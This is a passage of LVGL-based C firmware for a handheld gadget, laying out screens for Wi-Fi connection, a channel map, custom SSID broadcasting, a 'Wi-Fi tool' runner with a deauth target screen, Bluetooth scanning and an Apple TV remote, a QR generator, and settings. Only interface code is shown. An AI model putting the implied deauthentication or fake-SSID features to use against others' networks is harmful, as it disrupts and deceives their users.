  lv_obj_set_style_text_align(wifi_connect_network_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_color(wifi_connect_network_label, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_connect_network_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_pos(wifi_connect_network_label, 13, 90);

  wifi_connect_password_textarea = lv_textarea_create(wifi_connect_screen);
  lv_textarea_set_one_line(wifi_connect_password_textarea, true);
  lv_textarea_set_password_mode(wifi_connect_password_textarea, true);
  lv_textarea_set_max_length(wifi_connect_password_textarea, 63);
  lv_textarea_set_placeholder_text(wifi_connect_password_textarea, "Wi-Fi password");
  lv_obj_set_size(wifi_connect_password_textarea, 286, 38);
  lv_obj_set_pos(wifi_connect_password_textarea, 17, 132);

  wifi_connect_keyboard = lv_keyboard_create(wifi_connect_screen);
  lv_keyboard_set_textarea(wifi_connect_keyboard, wifi_connect_password_textarea);
  lv_obj_set_size(wifi_connect_keyboard, 320, 166);
  lv_obj_set_pos(wifi_connect_keyboard, 0, 178);

  wifi_connect_status_label = lv_label_create(wifi_connect_screen);
  lv_obj_set_width(wifi_connect_status_label, 294);
  lv_obj_set_style_text_align(wifi_connect_status_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_color(wifi_connect_status_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_connect_status_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_pos(wifi_connect_status_label, 13, 350);

  create_button(wifi_connect_screen, 18, 390, 180, 38,
                "CONNECT & SAVE", COLOR_GREEN, connect_selected_wifi);
  create_button(wifi_connect_screen, 208, 390, 94, 38,
                "CANCEL", COLOR_SETTINGS, cancel_wifi_connection);

  wifi_channels_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(wifi_channels_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(wifi_channels_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(wifi_channels_screen, false);
  create_header(wifi_channels_screen, "CHANNEL MAP");
  lv_obj_t *channel_note = lv_label_create(wifi_channels_screen);
  lv_label_set_text(channel_note, "Taller bars mean more nearby networks.");
  lv_obj_set_width(channel_note, 288);
  lv_obj_set_style_text_align(channel_note, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_color(channel_note, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(channel_note, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_align(channel_note, LV_ALIGN_TOP_MID, 0, 94);
  for (uint8_t i = 0; i < 13; i++) {
    lv_obj_t *column = lv_obj_create(wifi_channels_screen);
    lv_obj_set_size(column, 20, 150);
    lv_obj_set_pos(column, 19 + i * 22, 142);
    lv_obj_set_style_pad_all(column, 0, LV_PART_MAIN);
    lv_obj_set_style_bg_opa(column, LV_OPA_TRANSP, LV_PART_MAIN);
    lv_obj_set_style_border_width(column, 0, LV_PART_MAIN);
    lv_obj_clear_flag(column, LV_OBJ_FLAG_SCROLLABLE);
    wifi_channel_bars[i] = lv_obj_create(column);
    lv_obj_set_size(wifi_channel_bars[i], 14, 3);
    lv_obj_align(wifi_channel_bars[i], LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(wifi_channel_bars[i], lv_color_hex((i == 0 || i == 5 || i == 10) ? COLOR_GREEN : COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_border_width(wifi_channel_bars[i], 0, LV_PART_MAIN);
    lv_obj_set_style_radius(wifi_channel_bars[i], 3, LV_PART_MAIN);
    lv_obj_clear_flag(wifi_channel_bars[i], LV_OBJ_FLAG_SCROLLABLE);
    wifi_channel_count_labels[i] = lv_label_create(wifi_channels_screen);
    lv_label_set_text(wifi_channel_count_labels[i], "0");
    lv_obj_set_style_text_color(wifi_channel_count_labels[i], lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
    lv_obj_set_style_text_font(wifi_channel_count_labels[i], &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_set_pos(wifi_channel_count_labels[i], 23 + i * 22, 126);
    lv_obj_t *channel_number = lv_label_create(wifi_channels_screen);
    lv_label_set_text_fmt(channel_number, "%u", i + 1);
    lv_obj_set_style_text_color(channel_number, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
    lv_obj_set_style_text_font(channel_number, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_set_pos(channel_number, 22 + i * 22, 302);
  }
  create_button(wifi_channels_screen, 12, 352, 142, 38, "REFRESH", COLOR_GREEN, refresh_wifi_channels);
  create_button(wifi_channels_screen, 166, 352, 142, 38, "NETWORK LIST", COLOR_RF, open_wifi_networks);
  create_button(wifi_channels_screen, 70, 400, 180, 28, "<  WI-FI TOOLS", COLOR_SETTINGS, back_to_wifi_home);
  create_footer(wifi_channels_screen);
  refresh_wifi_channel_chart();

  wifi_tool_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(wifi_tool_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(wifi_tool_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(wifi_tool_screen, false);
  create_header(wifi_tool_screen, "WI-FI TOOL");
  wifi_tool_title_label = lv_label_create(wifi_tool_screen);
  lv_label_set_text(wifi_tool_title_label, "WI-FI TOOL");
  lv_obj_set_width(wifi_tool_title_label, 292);
  lv_obj_set_style_text_align(wifi_tool_title_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_color(wifi_tool_title_label, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_tool_title_label, &lv_font_montserrat_16, LV_PART_MAIN);
  lv_obj_align(wifi_tool_title_label, LV_ALIGN_TOP_MID, 0, 96);
  lv_obj_t *tool_panel = lv_obj_create(wifi_tool_screen);
  lv_obj_set_size(tool_panel, 294, 196);
  lv_obj_set_pos(tool_panel, 13, 136);
  lv_obj_set_style_bg_color(tool_panel, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_border_color(tool_panel, lv_color_hex(COLOR_RF), LV_PART_MAIN);
  lv_obj_set_style_border_width(tool_panel, 1, LV_PART_MAIN);
  lv_obj_set_style_radius(tool_panel, 12, LV_PART_MAIN);
  lv_obj_clear_flag(tool_panel, LV_OBJ_FLAG_SCROLLABLE);
  wifi_tool_status_label = lv_label_create(tool_panel);
  lv_label_set_text(wifi_tool_status_label, "Tap START to run this tool.");
  lv_obj_set_width(wifi_tool_status_label, 264);
  lv_obj_set_style_text_align(wifi_tool_status_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_color(wifi_tool_status_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_tool_status_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_center(wifi_tool_status_label);
  wifi_tool_action_button = create_button(wifi_tool_screen, 35, 350, 250, 42, "START", COLOR_GREEN, run_wifi_tool);
  create_button(wifi_tool_screen, 70, 400, 180, 28, "<  WI-FI TOOLS", COLOR_SETTINGS, stop_and_leave_wifi_tool);
  create_footer(wifi_tool_screen);
  create_wifi_deauth_target_screen();
  refresh_wifi_defensive_target_list();

  wifi_custom_ssids_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(wifi_custom_ssids_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(wifi_custom_ssids_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(wifi_custom_ssids_screen, false);
  create_header(wifi_custom_ssids_screen, "CUSTOM SSIDS");
  wifi_custom_ssid_status_label = lv_label_create(wifi_custom_ssids_screen);
  lv_label_set_text(wifi_custom_ssid_status_label, "STOPPED");
  lv_obj_set_width(wifi_custom_ssid_status_label, 300);
  lv_obj_set_style_text_align(wifi_custom_ssid_status_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_custom_ssid_status_label, &lv_font_montserrat_10, LV_PART_MAIN);
  lv_obj_set_style_text_color(wifi_custom_ssid_status_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_pos(wifi_custom_ssid_status_label, 10, 82);
  wifi_custom_ssid_list = lv_obj_create(wifi_custom_ssids_screen);
  lv_obj_set_size(wifi_custom_ssid_list, 296, 174);
  lv_obj_set_pos(wifi_custom_ssid_list, 12, 112);
  lv_obj_set_style_pad_all(wifi_custom_ssid_list, 6, LV_PART_MAIN);
  lv_obj_set_style_bg_color(wifi_custom_ssid_list, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_border_color(wifi_custom_ssid_list, lv_color_hex(COLOR_RF), LV_PART_MAIN);
  lv_obj_set_style_border_width(wifi_custom_ssid_list, 1, LV_PART_MAIN);
  lv_obj_set_scroll_dir(wifi_custom_ssid_list, LV_DIR_VER);
  create_button(wifi_custom_ssids_screen, 8, 294, 70, 30, "ADD", COLOR_GREEN, add_wifi_custom_ssid);
  create_button(wifi_custom_ssids_screen, 86, 294, 70, 30, "EDIT", COLOR_RF, edit_wifi_custom_ssid);
  create_button(wifi_custom_ssids_screen, 164, 294, 70, 30, "DELETE", COLOR_RED, delete_wifi_custom_ssid);
  create_button(wifi_custom_ssids_screen, 242, 294, 70, 30, "SAVE", COLOR_SAVED, persist_wifi_custom_ssids);
  lv_obj_t *channel_down = create_button(wifi_custom_ssids_screen, 12, 334, 42, 30, "-", COLOR_SETTINGS, NULL);
  lv_obj_add_event_cb(channel_down, change_wifi_custom_ssid_channel, LV_EVENT_CLICKED, (void *)(intptr_t)-1);
  wifi_custom_ssid_channel_label = lv_label_create(wifi_custom_ssids_screen);
  lv_label_set_text(wifi_custom_ssid_channel_label, "CHANNEL 1");
  lv_obj_set_width(wifi_custom_ssid_channel_label, 116);
  lv_obj_set_style_text_align(wifi_custom_ssid_channel_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_color(wifi_custom_ssid_channel_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_custom_ssid_channel_label, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_set_pos(wifi_custom_ssid_channel_label, 58, 342);
  lv_obj_t *channel_up = create_button(wifi_custom_ssids_screen, 178, 334, 42, 30, "+", COLOR_SETTINGS, NULL);
  lv_obj_add_event_cb(channel_up, change_wifi_custom_ssid_channel, LV_EVENT_CLICKED, (void *)(intptr_t)1);
  wifi_custom_ssid_count_label = lv_label_create(wifi_custom_ssids_screen);
  lv_label_set_text(wifi_custom_ssid_count_label, "0 SELECTED");
  lv_obj_set_width(wifi_custom_ssid_count_label, 88);
  lv_obj_set_style_text_align(wifi_custom_ssid_count_label, LV_TEXT_ALIGN_RIGHT, LV_PART_MAIN);
  lv_obj_set_style_text_color(wifi_custom_ssid_count_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_custom_ssid_count_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_pos(wifi_custom_ssid_count_label, 222, 343);
  create_button(wifi_custom_ssids_screen, 18, 374, 136, 38, "START", COLOR_GREEN, toggle_wifi_custom_ssids);
  create_button(wifi_custom_ssids_screen, 166, 374, 136, 38, "STOP", COLOR_RED, stop_wifi_custom_ssids_event);
  create_button(wifi_custom_ssids_screen, 70, 406, 180, 28, "<  WI-FI TOOLS", COLOR_SETTINGS, back_to_wifi_home);
  create_footer(wifi_custom_ssids_screen);

  wifi_custom_ssid_editor_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(wifi_custom_ssid_editor_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(wifi_custom_ssid_editor_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(wifi_custom_ssid_editor_screen, false);
  create_header(wifi_custom_ssid_editor_screen, "EDIT SSID NAME");
  wifi_custom_ssid_textarea = lv_textarea_create(wifi_custom_ssid_editor_screen);
  lv_textarea_set_one_line(wifi_custom_ssid_textarea, true);
  lv_textarea_set_max_length(wifi_custom_ssid_textarea, 32);
  lv_textarea_set_placeholder_text(wifi_custom_ssid_textarea, "SSID name (1-32 characters)");
  lv_obj_set_size(wifi_custom_ssid_textarea, 292, 42);
  lv_obj_set_pos(wifi_custom_ssid_textarea, 14, 98);
  wifi_custom_ssid_keyboard = lv_keyboard_create(wifi_custom_ssid_editor_screen);
  lv_keyboard_set_textarea(wifi_custom_ssid_keyboard, wifi_custom_ssid_textarea);
  lv_obj_set_size(wifi_custom_ssid_keyboard, 320, 202);
  lv_obj_set_pos(wifi_custom_ssid_keyboard, 0, 150);
  create_button(wifi_custom_ssid_editor_screen, 18, 370, 136, 38, "KEEP NAME", COLOR_GREEN, commit_wifi_custom_ssid);
  create_button(wifi_custom_ssid_editor_screen, 166, 370, 136, 38, "CANCEL", COLOR_SETTINGS, cancel_wifi_custom_ssid_editor);
  create_footer(wifi_custom_ssid_editor_screen);

  load_wifi_custom_ssids();
  refresh_wifi_custom_ssid_screen();
}


void create_ble_screen() {
  ble_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(ble_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(ble_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(ble_screen, false);
  create_header(ble_screen, "SCAN FOR BLUETOOTH");

  ble_info_label = lv_label_create(ble_screen);
  lv_label_set_text(ble_info_label,
                    "Find nearby BLE broadcast names.\nApple TV control uses a Bluetooth\nkeyboard connection.");
  lv_obj_set_width(ble_info_label, 280);
  lv_obj_set_style_text_color(ble_info_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(ble_info_label, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_set_style_text_align(ble_info_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(ble_info_label, LV_ALIGN_TOP_MID, 0, 106);

  create_button(ble_screen, 35, 205, 250, 44, "APPLE TV REMOTE", COLOR_BLUETOOTH, open_bluetooth_from_ble);
  create_button(ble_screen, 35, 259, 250, 44, "REMEMBERED DEVICES", COLOR_BLUETOOTH,
                open_bluetooth_bonds);
  create_button(ble_screen, 35, 313, 250, 44, "SCAN FOR BLUETOOTH", COLOR_BLUETOOTH,
                scan_nearby_ble);
  create_button(ble_screen, 70, 392, 180, 30, "HOME", COLOR_SETTINGS, go_home);
  create_footer(ble_screen);
}


void create_bluetooth_screen() {
  bluetooth_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(bluetooth_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(bluetooth_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(bluetooth_screen, false);
  create_header(bluetooth_screen, "BLUETOOTH REMOTE");

  bluetooth_state_label = lv_label_create(bluetooth_screen);
  lv_obj_set_style_text_color(bluetooth_state_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(bluetooth_state_label, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_set_style_text_align(bluetooth_state_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(bluetooth_state_label, LV_ALIGN_TOP_MID, 0, 105);

  create_button(bluetooth_screen, 60, 190, 200, 36, "PAIR / RECONNECT", COLOR_BLUETOOTH, bluetooth_pair);
  bluetooth_remote_controls[0] = create_button(bluetooth_screen, 125, 240, 70, 35, "UP", COLOR_BLUETOOTH, bluetooth_up);
  bluetooth_remote_controls[1] = create_button(bluetooth_screen, 45, 285, 70, 35, "LEFT", COLOR_BLUETOOTH, bluetooth_left);
  bluetooth_remote_controls[2] = create_button(bluetooth_screen, 125, 285, 70, 35, "SELECT", COLOR_GREEN, bluetooth_select);
  bluetooth_remote_controls[3] = create_button(bluetooth_screen, 205, 285, 70, 35, "RIGHT", COLOR_BLUETOOTH, bluetooth_right);
  bluetooth_remote_controls[4] = create_button(bluetooth_screen, 125, 330, 70, 35, "DOWN", COLOR_BLUETOOTH, bluetooth_down);
  bluetooth_remote_controls[5] = create_button(bluetooth_screen, 45, 375, 100, 28, "DEVICE BACK", COLOR_SETTINGS, bluetooth_back);
  bluetooth_remote_controls[6] = create_button(bluetooth_screen, 175, 375, 100, 28, "PLAY/PAUSE", COLOR_GREEN, bluetooth_play_pause);
  create_button(bluetooth_screen, 45, 405, 105, 22, "BACK", COLOR_BLUETOOTH, bluetooth_return);
  create_button(bluetooth_screen, 170, 405, 105, 22, "HOME", COLOR_SETTINGS, go_home);
  create_footer(bluetooth_screen);
  refresh_bluetooth_screen();
}


void create_bluetooth_bonds_screen() {
  bluetooth_bonds_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(bluetooth_bonds_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(bluetooth_bonds_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(bluetooth_bonds_screen, false);
  create_header(bluetooth_bonds_screen, "BT REMEMBERED DEVICES");

  bluetooth_bonds_label = lv_label_create(bluetooth_bonds_screen);
  lv_obj_set_width(bluetooth_bonds_label, 292);
  lv_obj_set_style_text_color(bluetooth_bonds_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(bluetooth_bonds_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(bluetooth_bonds_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(bluetooth_bonds_label, LV_ALIGN_TOP_MID, 0, 98);

  lv_obj_t *bond_table = lv_obj_create(bluetooth_bonds_screen);
  lv_obj_set_size(bond_table, 292, 126);
  lv_obj_set_pos(bond_table, 14, 116);
  lv_obj_set_style_pad_all(bond_table, 5, LV_PART_MAIN);
  lv_obj_set_style_bg_color(bond_table, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(bond_table, LV_OPA_COVER, LV_PART_MAIN);
  lv_obj_set_style_border_color(bond_table, lv_color_hex(COLOR_BLUETOOTH), LV_PART_MAIN);
  lv_obj_set_style_border_width(bond_table, 2, LV_PART_MAIN);
  lv_obj_set_style_radius(bond_table, 8, LV_PART_MAIN);
  lv_obj_clear_flag(bond_table, LV_OBJ_FLAG_SCROLLABLE);

  for (uint8_t i = 0; i < MAX_BLUETOOTH_BOND_ROWS; i++) {
    bluetooth_bond_rows[i] = lv_obj_create(bond_table);
    lv_obj_set_size(bluetooth_bond_rows[i], 278, 35);
    lv_obj_set_pos(bluetooth_bond_rows[i], 0, i * 38);
    lv_obj_set_style_pad_all(bluetooth_bond_rows[i], 0, LV_PART_MAIN);
    lv_obj_set_style_bg_opa(bluetooth_bond_rows[i], LV_OPA_COVER, LV_PART_MAIN);
    lv_obj_set_style_radius(bluetooth_bond_rows[i], 5, LV_PART_MAIN);
    lv_obj_clear_flag(bluetooth_bond_rows[i], LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_event_cb(bluetooth_bond_rows[i], select_bluetooth_bond_row,
                        LV_EVENT_CLICKED, (void *)(uintptr_t)i);

    bluetooth_bond_number_labels[i] = lv_label_create(bluetooth_bond_rows[i]);
    lv_obj_set_style_text_color(bluetooth_bond_number_labels[i], lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
    lv_obj_set_style_text_font(bluetooth_bond_number_labels[i], &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_align(bluetooth_bond_number_labels[i], LV_ALIGN_LEFT_MID, 8, 0);

    bluetooth_bond_address_labels[i] = lv_label_create(bluetooth_bond_rows[i]);
    lv_obj_set_style_text_color(bluetooth_bond_address_labels[i], lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
    lv_obj_set_style_text_font(bluetooth_bond_address_labels[i], &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_align(bluetooth_bond_address_labels[i], LV_ALIGN_RIGHT_MID, -8, 0);
  }

  create_button(bluetooth_bonds_screen, 25, 252, 125, 38, "PREVIOUS", COLOR_BLUETOOTH,
                bluetooth_previous_bond);
  create_button(bluetooth_bonds_screen, 170, 252, 125, 38, "NEXT", COLOR_BLUETOOTH,
                bluetooth_next_bond);
  bluetooth_forget_selected_button = create_button(
    bluetooth_bonds_screen, 45, 305, 230, 44, "FORGET SELECTED", COLOR_RED,
    request_bluetooth_forget
  );
  lv_obj_add_flag(bluetooth_forget_selected_button, LV_OBJ_FLAG_HIDDEN);
  create_button(bluetooth_bonds_screen, 70, 385, 180, 32, "BACK", COLOR_SETTINGS,
                bluetooth_bonds_return);
  create_footer(bluetooth_bonds_screen);
  refresh_bluetooth_bonds_screen();
}


void create_bluetooth_forget_confirm_screen() {
  bluetooth_forget_confirm_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(bluetooth_forget_confirm_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(bluetooth_forget_confirm_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(bluetooth_forget_confirm_screen, false);
  create_header(bluetooth_forget_confirm_screen, "FORGET BT DEVICE?");

  bluetooth_forget_confirm_label = lv_label_create(bluetooth_forget_confirm_screen);
  lv_obj_set_width(bluetooth_forget_confirm_label, 285);
  lv_obj_set_style_text_color(bluetooth_forget_confirm_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(bluetooth_forget_confirm_label, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_set_style_text_align(bluetooth_forget_confirm_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(bluetooth_forget_confirm_label, LV_ALIGN_TOP_MID, 0, 135);

  create_button(bluetooth_forget_confirm_screen, 25, 330, 130, 44, "FORGET", COLOR_RED,
                confirm_bluetooth_forget);
  create_button(bluetooth_forget_confirm_screen, 165, 330, 130, 44, "CANCEL", COLOR_GREEN,
                cancel_bluetooth_forget);
  create_footer(bluetooth_forget_confirm_screen);
}


void open_qr_generator(lv_event_t *e) {
  if (qr_generator_screen == NULL) create_qr_generator_screen();
  lv_textarea_set_text(qr_textarea, qr_last_text);
  lv_scr_load(qr_generator_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void generate_qr_code(lv_event_t *e) {
  if (qr_textarea == NULL) return;
  const char *entered_text = lv_textarea_get_text(qr_textarea);
  if (entered_text == NULL || entered_text[0] == '\0') {
    set_status("ENTER TEXT OR A LINK", COLOR_RED);
    return;
  }

  strncpy(qr_last_text, entered_text, sizeof(qr_last_text) - 1);
  qr_last_text[sizeof(qr_last_text) - 1] = '\0';
  if (qr_display_screen == NULL) create_qr_display_screen();
  lv_qrcode_update(qr_code, qr_last_text, strlen(qr_last_text));
  lv_label_set_text(qr_preview_label, qr_last_text);
  lv_scr_load(qr_display_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void qr_new_code(lv_event_t *e) {
  open_qr_generator(e);
}


void create_qr_generator_screen() {
  qr_generator_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(qr_generator_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(qr_generator_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(qr_generator_screen, false);
  create_header(qr_generator_screen, "QR GENERATOR");

  lv_obj_t *info = lv_label_create(qr_generator_screen);
  lv_label_set_text(info, "Create a QR code for text,\na link, or Wi-Fi details.");
  lv_obj_set_style_text_color(info, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(info, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(info, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(info, LV_ALIGN_TOP_MID, 0, 105);

  qr_textarea = lv_textarea_create(qr_generator_screen);
  lv_textarea_set_one_line(qr_textarea, true);
  lv_textarea_set_max_length(qr_textarea, sizeof(qr_last_text) - 1);
  lv_textarea_set_placeholder_text(qr_textarea, "Text or URL");
  lv_obj_set_size(qr_textarea, 270, 40);
  lv_obj_align(qr_textarea, LV_ALIGN_TOP_MID, 0, 145);

  lv_obj_t *keyboard = lv_keyboard_create(qr_generator_screen);
  lv_keyboard_set_textarea(keyboard, qr_textarea);
  lv_obj_set_size(keyboard, 320, 145);
  lv_obj_align(keyboard, LV_ALIGN_TOP_MID, 0, 192);

  create_button(qr_generator_screen, 35, 352, 120, 38,
                "GENERATE", COLOR_QR, generate_qr_code);
  create_button(qr_generator_screen, 165, 352, 120, 38,
                "SETTINGS", COLOR_SETTINGS, open_settings);
  create_footer(qr_generator_screen);
}


void create_qr_display_screen() {
  qr_display_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(qr_display_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(qr_display_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(qr_display_screen, false);
  create_header(qr_display_screen, "YOUR QR CODE");

  qr_code = lv_qrcode_create(qr_display_screen, 190,
                             lv_color_hex(COLOR_BG), lv_color_hex(COLOR_TEXT));
  lv_obj_set_style_border_color(qr_code, lv_color_hex(COLOR_QR), LV_PART_MAIN);
  lv_obj_set_style_border_width(qr_code, 2, LV_PART_MAIN);
  lv_obj_align(qr_code, LV_ALIGN_TOP_MID, 0, 102);
  lv_qrcode_update(qr_code, qr_last_text, strlen(qr_last_text));

  qr_preview_label = lv_label_create(qr_display_screen);
  lv_obj_set_width(qr_preview_label, 270);
  lv_label_set_long_mode(qr_preview_label, LV_LABEL_LONG_DOT);
  lv_label_set_text(qr_preview_label, qr_last_text);
  lv_obj_set_style_text_color(qr_preview_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(qr_preview_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(qr_preview_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(qr_preview_label, LV_ALIGN_TOP_MID, 0, 302);

  create_button(qr_display_screen, 35, 345, 120, 38,
                "NEW CODE", COLOR_QR, qr_new_code);
  create_button(qr_display_screen, 165, 345, 120, 38,
                "SETTINGS", COLOR_SETTINGS, open_settings);
  create_footer(qr_display_screen);
}


void create_brightness_screen() {
  brightness_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(brightness_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(brightness_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(brightness_screen, false);
  create_header(brightness_screen, "DISPLAY BRIGHTNESS");

  brightness_value_label = lv_label_create(brightness_screen);
  lv_obj_set_style_text_color(brightness_value_label, lv_color_hex(COLOR_SETTINGS), LV_PART_MAIN);
  lv_obj_set_style_text_font(brightness_value_label, &lv_font_montserrat_16, LV_PART_MAIN);
  lv_obj_align(brightness_value_label, LV_ALIGN_TOP_MID, 0, 135);

  create_button(brightness_screen, 30, 220, 120, 55,
                "- 10%", COLOR_SETTINGS, decrease_brightness);
  create_button(brightness_screen, 170, 220, 120, 55,
                "+ 10%", COLOR_SETTINGS, increase_brightness);

  lv_obj_t *note = lv_label_create(brightness_screen);
  lv_label_set_text(note, "Brightness is saved automatically.");
  lv_obj_set_style_text_color(note, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(note, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_align(note, LV_ALIGN_TOP_MID, 0, 300);
  create_button(brightness_screen, 70, 365, 180, 38,
                "BACK TO SETTINGS", COLOR_SETTINGS, open_settings);
  create_footer(brightness_screen);
  refresh_brightness_screen();
}


void create_clock_settings_screen() {
  clock_settings_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(clock_settings_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(clock_settings_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(clock_settings_screen, false);
  create_header(clock_settings_screen, "CLOCK SETTINGS");

  clock_edit_value_label = lv_label_create(clock_settings_screen);
  lv_obj_set_style_text_color(clock_edit_value_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(clock_edit_value_label, &lv_font_montserrat_16, LV_PART_MAIN);
  lv_obj_align(clock_edit_value_label, LV_ALIGN_TOP_MID, 0, 112);

  clock_edit_field_label = lv_label_create(clock_settings_screen);
  lv_obj_set_style_text_color(clock_edit_field_label, lv_color_hex(COLOR_SETTINGS), LV_PART_MAIN);
  lv_obj_set_style_text_font(clock_edit_field_label, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_align(clock_edit_field_label, LV_ALIGN_TOP_MID, 0, 150);

  create_button(clock_settings_screen, 18, 188, 136, 40,
                "< FIELD", COLOR_SETTINGS, clock_previous_field);
  create_button(clock_settings_screen, 166, 188, 136, 40,
                "FIELD >", COLOR_SETTINGS, clock_next_field);
  create_button(clock_settings_screen, 18, 240, 136, 48,
                "- VALUE", COLOR_SETTINGS, clock_decrease_value);
  create_button(clock_settings_screen, 166, 240, 136, 48,
                "+ VALUE", COLOR_SETTINGS, clock_increase_value);
  create_button(clock_settings_screen, 18, 302, 136, 40,
